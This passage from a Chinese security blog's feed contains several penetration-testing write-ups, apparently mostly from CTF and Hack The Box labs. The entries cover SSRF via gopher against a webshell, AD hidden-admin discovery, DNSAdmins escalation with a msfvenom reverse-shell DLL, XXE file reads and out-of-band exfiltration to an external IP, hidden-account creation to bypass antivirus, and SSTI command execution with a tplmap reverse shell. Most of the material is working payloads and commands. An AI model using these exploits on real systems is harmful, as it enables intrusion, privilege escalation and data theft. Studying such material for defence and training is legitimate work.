cmd.php</li><li>save</li></ul><p>Gopher有如下几点问题</p><ol><li>PHP的curl默认不跟随302跳转</li><li>curl7.43gopher协议存在%00截断的BUG，v7.45以上可用</li><li>file_get_contents()的SSRF，gopher协议不能使用URLencode</li><li>file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</li></ol><h2 id="SSRF-打内网之POST请求-CTF题目"><a href="#SSRF-打内网之POST请求-CTF题目" class="headerlink" title="SSRF 打内网之POST请求(CTF题目)"></a>SSRF 打内网之POST请求(CTF题目)</h2><p><a href="http://152.136.63.75:8016/index.php?url=" target="_blank" rel="noopener">http://152.136.63.75:8016/index.php?url=</a>    —&gt;存在SSRF</p><p>目录扫描发现 <a href="http://152.136.63.75:8016/webshe11231231231.php" target="_blank" rel="noopener">http://152.136.63.75:8016/webshe11231231231.php</a> 页面</p><p>view-source:<a href="http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php" target="_blank" rel="noopener">http://152.136.63.75:8016/index.php?url=file:///var/www/html/webshe11231231231.php</a>   —&gt;file读取webshell源码</p><pre><code>&lt;?php$serverList = array(&quot;127.0.0.1&quot;);$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];foreach ($serverList as $host) {if ($ip === $host) {if ((!empty($_POST[&apos;admin&apos;])) and $_POST[&apos;admin&apos;] === &apos;h1admin&apos;) {@eval($_POST[&apos;hacker&apos;]);} else {die(&quot;You aren&apos;t admin!&quot;);}} else {die(&apos;This is webshell&apos;);}}</code></pre><p>GET请求的话可以直接利用，但这里需要POST请求才能利用，需要进一步处理—-&gt;使用Gopher协议并对POST payload包进行编码，编码脚本如下：</p><pre><code>exp = &apos;&apos;&apos;\POST /webshe11231231231.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: deflateDNT: 1Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 56admin=h1admin&amp;hacker=system(&apos;cat fl1234aaaaaggggg.php&apos;);&apos;&apos;&apos;import urllibtmp = urllib.quote(exp)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = &quot;_&quot;+urllib.quote(new)print result</code></pre><p>更改命令的时候Content-Length的值也需要修改<br>根据Gopher协议，编码的第一个字符无效，所以用第一位放个  “_”</p><p><img src="2.png" alt=""></p><p>如上图所示，所以需要两次编码</p><p>生成paylaod：</p><pre><code>kali@kali:~$ python exp.py_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A</code></pre><p>最后exp：</p><pre><code>152.136.63.75:8016/index.php?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520WOW64%253B%2520rv%253A47.0%2529%2520Gecko/20100101%2520Firefox/47.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C/%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Cen-US%253Bq%253D0.5%252Cen%253Bq%253D0.3%250D%250AAccept-Encoding%253A%2520deflate%250D%250ADNT%253A%25201%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252056%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527cat%2520fl1234aaaaaggggg.php%2527%2529%253B%250D%250A</code></pre><p><img src="3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://docs.ioin.in/writeup/fuzz.wuyun.org/_src_build_your_ssrf_exp_autowork_pdf/index.pdf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;猪猪侠S
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域渗透之隐藏管理员用户和派生本地管理员</title>
    <link href="https://github.com/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/"/>
    <id>https://github.com/2020/05/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%90%E8%97%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%92%8C%E6%B4%BE%E7%94%9F%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98/</id>
    <published>2020-05-01T04:34:28.000Z</published>
    <updated>2020-05-01T04:51:06.725Z</updated>
    
    <content type="html"><![CDATA[<p>典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）</p><p>常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。</p><p>这个过程往往伴随着隐藏管理员账户和派生本地管理员的发现</p><p><strong>域隐藏管理账户：</strong></p><p>A是“技术管理”组的成员，”技术管理”组是“ DOMAIN ADMINS”组的成员，因此A是域管理员。</p><p>由于A并不直接在Domain Admins组中，所以当我们直接查询”Domain Admins“组成员时，并不会直接看到A。而是找到“技术管理”组，然后必须通过枚举”技术管理”组才能找到其成员A</p><p><strong>Derivative Local Admins（派生本地管理员）：</strong><br>在我的理解中，派生本地管理员是一种特殊的隐藏管理账户：</p><p><a href="http://www.sixdub.net/?p=591" target="_blank" rel="noopener">经典案例</a>：（在这个例子中，Sally是WorkStation A中的派生本地管理员）</p><p><img src="1.png" alt=""></p><p><strong>环境描述：</strong></p><ul><li><p>域组 “Network Ops”是”Wokstation A”的本地管理组的成员（而这里A恰恰是域管成员Tim登录的机子）  </p></li><li><p>域组”Workstation Admins”是”Workstation B”的本地管理组的成员，Sally和Fred是域组”Workstation B”的成员</p></li><li><p>Fred同时又是域组”Network Ops”中的成员，Fred在 “Workstation B”上登录</p></li><li><p>Sally在 “Workstation C”上登录</p></li></ul><p>通过获取 “Workstation C”的系统权限，提取Sally的凭证，借助这个凭证访问”Workstation B”，在”Workstation B”提取之后提取Fred凭证，借助Fred凭证获取”Workstation A”的管理员权限。</p><p>直接截取原文中的实际利用步骤：</p><p><img src="2.png" alt=""></p><p>则可以得出结论：能够获取到作为（域管登录机子）本地管理员组的成员的域组中成员凭据…的其他机子中的用户…即为该机子的派生管理员（手动断句，方便阅读）</p><p>那么我们简化一下上边的图，画出自己的理解图：</p><p><img src="3.png" alt=""></p><p>隐藏管理员账户可以通过上边例子中的方法手动查找，也可以使用Bloodhound更方便查找</p><p><strong>使用Bloodhound查找隐藏管理账户</strong>的几种方法：</p><ul><li>Map Domain Trust</li><li>左键点击，直接在视图左侧查看节点信息；或者右键单击一个节点，然后选择子选项“ Expand”以查看该节点的成员</li><li>搜索“Domain Controller“ —-&gt; Group Member（查找组）—-&gt;（左击其中的组）Local Admin Rights–&gt;Derivative Local Admin Rights</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;典型的域权限提升的过程围绕着收集纯文本凭据、或登录到拥有（或者能够获取）系统权限的机子上，获取用户凭据（Mimikatz提取内存凭证）&lt;/p&gt;
&lt;p&gt;常常表现为查找域管理员登录的机子，通过横向，提权等手段获取该机子系统权限，然后转储域管理员凭证。&lt;/p&gt;
&lt;p&gt;这个过程往往
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域控提权之DNSadmins</title>
    <link href="https://github.com/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/"/>
    <id>https://github.com/2020/04/30/%E5%9F%9F%E6%8E%A7%E6%8F%90%E6%9D%83%E4%B9%8BDNSadmins/</id>
    <published>2020-04-30T12:54:39.000Z</published>
    <updated>2020-04-30T12:58:13.891Z</updated>
    
    <content type="html"><![CDATA[<p>默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限</p><p><strong>利用条件：</strong></p><p>拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS服务器对象的写特权</p><p><strong>whoami /groups  查看用户组</strong></p><p><img src="1.png" alt=""></p><p><strong>制作dll：</strong></p><pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll</code></pre><p><strong>开启smb共享：</strong>（可通过net use \10.10.14.67\tw 检测是否能连通smbserver  ， 关于smbserver不能连接，排除网络问题之后，可能是共享占用问题，更改共享名称重新开启smbserver即可）</p><pre><code>sudo impacket-smbserver tw .</code></pre><p><strong>注入dll</strong></p><pre><code>dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \\10.10.14.67\tw\plugin.dll</code></pre><p><strong>监听：</strong></p><pre><code>nc -lvvp 444</code></pre><p><strong>重启dns</strong>致使paylload生效：</p><pre><code>sc.exe stop dnssc.exe start dns</code></pre><p>或</p><pre><code>sc.exe \\10.10.10.169 stop dnssc.exe \\10.10.10.169 start dns</code></pre><p><img src="2.png" alt="">  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;默认情况下，域控也是DNS服务器，微软的DNS服务器作为域控上的服务来运行。通过DNSadmins到System，拿下域控权限&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;拥有DNSAdmins组成员的用户帐户权限，或者当前用户帐户具有对DNS
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XXE漏洞详解</title>
    <link href="https://github.com/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>https://github.com/2020/04/26/XXE%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-04-26T15:16:55.000Z</published>
    <updated>2020-04-26T15:38:20.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01、XXE原理："><a href="#0x01、XXE原理：" class="headerlink" title="0x01、XXE原理："></a>0x01、XXE原理：</h1><p>XXE：XML External Entity Injection；即XML外部实体注入（php版本大于5.4.45的默认不解析外部实体）</p><h2 id="1、XML：Extensible-Markup-Language，可扩展标记基础"><a href="#1、XML：Extensible-Markup-Language，可扩展标记基础" class="headerlink" title="1、XML：Extensible Markup Language，可扩展标记基础"></a><strong>1、XML：Extensible Markup Language，可扩展标记基础</strong></h2><p>XML被设计用来结构化、存储以及传输信息，且XML 允许创作者定义自己的标签和自己的文档结构。XML的构建模块结构如下：</p><ul><li><p>XML元素</p></li><li><p>属性</p></li><li><p>实体     </p></li></ul><p><strong>以一个简单的XXE POC为例：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  ###XML声明&lt;!DOCTYPE test [                                ####文档类型定义（DTD）&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;     ###定义实体名]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;   ###文档元素，使用实体名</code></pre><h2 id="2-DTD（文档类型定义）实体"><a href="#2-DTD（文档类型定义）实体" class="headerlink" title="2.DTD（文档类型定义）实体"></a>2.DTD（文档类型定义）实体</h2><ul><li><p>定义XML文件中有哪些模块，这些模块能包含什么样的内容</p></li><li><p>DTD可以在XML文档内声明，也可以外部引用</p></li></ul><p><strong>内部声明DTD：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [        定义此文档是 note 类型的文档。&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot; &lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型  &lt;!ELEMENT from    (#PCDATA)&gt;       &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body    (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><p><strong>引用外部DTD：</strong></p><p>DTD文件内容：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;    定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;&lt;!ELEMENT to      (#PCDATA)&gt;   定义 to 元素为 &quot;#PCDATA&quot; 类型&lt;!ELEMENT from    (#PCDATA)&gt;     &lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body    (#PCDATA)&gt;</code></pre><p>引用DTD：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE root SYSTEM &quot;http://xx.xx.xx.xx/evil.dtd&quot;&gt;&lt;note&gt;  &lt;to&gt;George&lt;/to&gt;  &lt;from&gt;John&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;&lt;/note&gt;</code></pre><blockquote><p>ELEMENT被过滤的情况下，可以将ELEMENT写入到DTD，外部引用;或外带查询</p></blockquote><h2 id="3、为什么能形成注入？"><a href="#3、为什么能形成注入？" class="headerlink" title="3、为什么能形成注入？"></a>3、为什么能形成注入？</h2><pre><code>XML 外部实体可以解析外部文件的特性，使得攻击成为可能；当XML允许引用外部实体，关键字“SYSTEM”会令XML解析器从URI中读取内容，并允许它在XML文档中被替换</code></pre><p>简单的漏洞代码：</p><pre><code>&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&apos;php://input&apos;);$dom = new DOMDocument();# LIBXML_NOENT: 将 XML 中的实体引用 替换 成对应的值# LIBXML_DTDLOAD: 加载 DOCTYPE 中的 DTD 文件$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);$user = $creds-&gt;user;$pass = $creds-&gt;pass;#回显信息  echo &quot;You have logged in as user $user&quot;;###漏洞触发点在user元素中?&gt;</code></pre><h1 id="0x02、XXE漏洞验证："><a href="#0x02、XXE漏洞验证：" class="headerlink" title="0x02、XXE漏洞验证："></a>0x02、XXE漏洞验证：</h1><p>如上漏洞代码poc，paylaod.txt：</p><pre><code>&lt;creds&gt;&lt;user&gt; Ed &lt;/user&gt;&lt;pass&gt; mypass &lt;/pass&gt;&lt;/creds&gt;</code></pre><blockquote><p>tips：读php或html文件时：（由于带有&lt; , &gt;符号会导致解析错误，使用如下paylaod）</p></blockquote><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/xx.php&quot;&gt;</code></pre><p>curl验证：</p><pre><code>curl -d @payload.txt http://localhost/xml_injectable.php</code></pre><p>显然这里是有回显的情况，无回显判断，一般还会监听一下我们的80端口是否收到对方的访问信息</p><p><img src="1.png" alt=""></p><h1 id="0x03、XXE能做什么："><a href="#0x03、XXE能做什么：" class="headerlink" title="0x03、XXE能做什么："></a>0x03、XXE能做什么：</h1><p><strong>[1]文件读取</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="2.png" alt=""></p><p><strong>[2]SSRF探测端口内网服务</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="3.png" alt=""></p><p>尝试在XXE漏洞代码中加入：<br>    error_reporting(0);</p><p><img src="4.png" alt=""></p><p>上边这个判断方法比较依赖于对方开启报错并回显；有回显但没有开启报错的情况下可以根据响应时间/长度，判断该端口是否已被开启（时间差还是很明显的）</p><p><strong>[3]Bind XXE （OOB）外带数据（无回显攻击）</strong></p><p>[代码中注释掉 echo “You have logged in as user $user”;]</p><p><strong>OOB  文件读取</strong></p><p>evil.dtd：</p><pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &apos;http://47.112.182.89/%file;&apos;&gt;&quot;&gt;</code></pre><p>payload.txt(按理说是读取php或者html文件才需要base64，可是我这里不经过base是没有信息返回的)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=C://windows//system.ini&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;%dtd; %all;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><img src="5.png" alt=""></p><p><strong>OOB  探测内网端口及服务：</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:3389&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://47.112.182.89/evil.dtd&quot;&gt;%dtd; %all;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><h1 id="0x04、攻击内网"><a href="#0x04、攻击内网" class="headerlink" title="0x04、攻击内网"></a>0x04、攻击内网</h1><p><strong>SSRF+内网服务命令执行实现内网攻击</strong></p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:81/ssrf.php?cmd=xxxxxxx&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>系统命令执行</strong></p><p>(PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上时才可用)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;creds&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</code></pre><p><strong>0x05、使用递归实体扩展进行DOS攻击</strong></p><h1 id="0x06、XXE漏洞挖掘："><a href="#0x06、XXE漏洞挖掘：" class="headerlink" title="0x06、XXE漏洞挖掘："></a>0x06、XXE漏洞挖掘：</h1><p> 如何判断是否存在XML外部实体攻击?那就是寻找那些接受XML作为输入内容的端点，而有些端点可能并不是那么明显，比如一些仅使用JSON去访问服务的客户端，可以通过修改HTTP的请求或修改Content-Type头部字段等方法，然后看应用程序的响应，看程序是否解析了发送的内容，如果解析了，那么就可能存在XXE攻击漏洞</p><p>比如这个案例：<a href="https://www.freebuf.com/vuls/167087.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/167087.html</a> ；通过更改contentn type类型值来fuzz目标是否能够正常响应XML值</p><pre><code>POST /action HTTP/1.0Content-Type: application/x-www-form-urlencodedContent-Length: 7foo=bar</code></pre><p>等价于：（一般WAF只会拦截application/x-www-form-urlencoded，通过更改为其他类型如text/xml 或 application/xml可绕过 ）</p><pre><code>POST /action HTTP/1.0Content-Type: text/xmlContent-Length: 52&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</code></pre><p><strong>1.文件上传XXE</strong>（XML、XLSX，DOCX，PPTX，SVG或任何XML MIME类型格式）</p><p><strong>2.传输内容XXE</strong> （支持XML）</p><p><strong>扩展之Json端点上的XXE</strong>：</p><p>原始JSON</p><pre><code>{&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;}</code></pre><p>XML转换(需要添加一个根元素，不然会成为无效的XML文档)</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;</code></pre><p>以HTB Fulcrum为例：疑似一个API返回一段json信息，但是我们没有能够与API进行交互的方法，只能尝试各种可能（OS[系统命令注入]、sqli、xxe、xpath等）</p><p><img src="6.png" alt=""></p><p>成功验证XXE</p><p><img src="7.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01、XXE原理：&quot;&gt;&lt;a href=&quot;#0x01、XXE原理：&quot; class=&quot;headerlink&quot; title=&quot;0x01、XXE原理：&quot;&gt;&lt;/a&gt;0x01、XXE原理：&lt;/h1&gt;&lt;p&gt;XXE：XML External Entity Injection；
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>调用API绕过杀软添加用户</title>
    <link href="https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/"/>
    <id>https://github.com/2020/04/26/%E8%B0%83%E7%94%A8API%E7%BB%95%E8%BF%87%E6%9D%80%E8%BD%AF%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7/</id>
    <published>2020-04-26T10:15:40.000Z</published>
    <updated>2020-04-26T10:32:15.700Z</updated>
    
    <content type="html"><![CDATA[<p><strong>创建隐藏账户：</strong></p><pre><code>net user tw$ password /add  ###用户名为tw，密码为password的也可以通过修改注册表实现，需要system权限    </code></pre><p><strong>如何发现隐藏账户：</strong></p><p>通过组查看：</p><pre><code>net localgroup administrators net localgroup users</code></pre><p>直接查看注册表，有什么用户一目了然<br>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</p><p>一般情况下，添加用户的net会被拦截，下面介绍通过API调用的方式绕过</p><p><strong>实现：</strong></p><p>微软提供<a href="https://docs.microsoft.com/en-us/windows/win32/netmgmt/creating-a-local-group-and-adding-a-user" target="_blank" rel="noopener">C++实现</a>原型：</p><pre><code>#ifndef UNICODE#define UNICODE#endif#pragma comment(lib, &quot;netapi32.lib&quot;)#include &lt;stdio.h&gt;#include &lt;assert.h&gt;#include &lt;windows.h&gt; #include &lt;lm.h&gt;int wmain(int argc, wchar_t *argv[]){   LPGROUP_USERS_INFO_0 pBuf = NULL;   DWORD dwLevel = 0;   DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;   DWORD dwEntriesRead = 0;   DWORD dwTotalEntries = 0;   NET_API_STATUS nStatus;   if (argc != 3)   {  fwprintf(stderr, L&quot;Usage: %s \\\\ServerName UserName\n&quot;, argv[0]);  exit(1);   }   nStatus = NetUserGetGroups(argv[1],  argv[2],  dwLevel,  (LPBYTE*)&amp;pBuf,  dwPrefMaxLen,  &amp;dwEntriesRead,  &amp;dwTotalEntries);   if (nStatus == NERR_Success)   {  LPGROUP_USERS_INFO_0 pTmpBuf;  DWORD i;  DWORD dwTotalCount = 0;  if ((pTmpBuf = pBuf) != NULL)  { fprintf(stderr, &quot;\nGlobal group(s):\n&quot;); for (i = 0; i &lt; dwEntriesRead; i++) {assert(pTmpBuf != NULL);if (pTmpBuf == NULL){   fprintf(stderr, &quot;An access violation has occurred\n&quot;);   break;}wprintf(L&quot;\t-- %s\n&quot;, pTmpBuf-&gt;grui0_name);pTmpBuf++;dwTotalCount++; }  }  if (dwEntriesRead &lt; dwTotalEntries) fprintf(stderr, &quot;\nTotal entries: %d&quot;, dwTotalEntries);  printf(&quot;\nEntries enumerated: %d\n&quot;, dwTotalCount);   }   else  fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);   if (pBuf != NULL)  NetApiBufferFree(pBuf);   return 0;}</code></pre><p>NetUserAdd添加普通用户，然后NetLocalGroupAddMembers添加到管理组</p><p>我用C实现效果如下：<br><img src="1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;创建隐藏账户：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;net user tw$ password /add  ###用户名为tw，密码为password的
也可以通过修改注册表实现，需要system权限    &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;st
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>SSTI[服务器模板注入]</title>
    <link href="https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>https://github.com/2020/04/26/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2020-04-26T05:32:06.000Z</published>
    <updated>2020-04-26T05:40:46.401Z</updated>
    
    <content type="html"><![CDATA[<p><strong>漏洞成因：</strong></p><p>用户输入未经过滤就交给引擎处理</p><p><a href="http://www.onelinerizer.com/" target="_blank" rel="noopener">将python语句编译成一句话： </a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">不同类型SSTI paylaod: </a></p><p>SSTI模板注入常见引擎：</p><p><img src="1.png" alt=""></p><p>判断是哪种类型SSTI</p><p><img src="2.png" alt=""></p><p><strong>一个实例：</strong></p><p>nikto结果：+ Server: Werkzeug/0.14.1 Python/2.7.14 —&gt;有可能存在SSTI<br>返回输入内容，已知</p><p><img src="3.png" alt=""></p><p><strong>检测SSTI</strong></p><p><img src="4.png" alt=""></p><p>name=49&amp;desc=yyyy   —&gt; Name: 7777777 desc: yyyy   —&gt; Jinja2（Twig将返回49）</p><p>确定是jinja之后，尝试文件读取和命令执行</p><p><strong>读取文件</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}</code></pre><p><img src="5.png" alt=""></p><p><strong>命令执行：</strong></p><pre><code>{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}{{ config.from_pyfile('/tmp/evilconfig.cfg') }}{{ config['RUNCMD']('ping -c 10.10.14.14 9999',shell=True) }}</code></pre><p><a href="https://github.com/epinna/tplmap">SSTI注入工具tplmap</a>： </p><pre><code>python tplmap.py -u&apos;http://10.10.10.96:8080&apos; -X POST -d&apos;name=*desc=anything&apos; -c &apos;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTU4NzczMTk1OX0.TTsnsWxpzkS32o7uluDl7n5Et4oTDcGiYAcfYPq2KjI&apos; --reverse-shell 10.10.14.14 9999</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;漏洞成因：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;用户输入未经过滤就交给引擎处理&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.onelinerizer.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;将python语句编译成一句
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MSSQL NTLM stealer</title>
    <link href="https://github.com/2020/04/26/MSSQL-NTLM-stealer/"/>
    <id>https://github.com/2020/04/26/MSSQL-NTLM-stealer/</id>
    <published>2020-04-26T05:24:48.000Z</published>
    <updated>2020-04-26T05:31:15.481Z</updated>
    
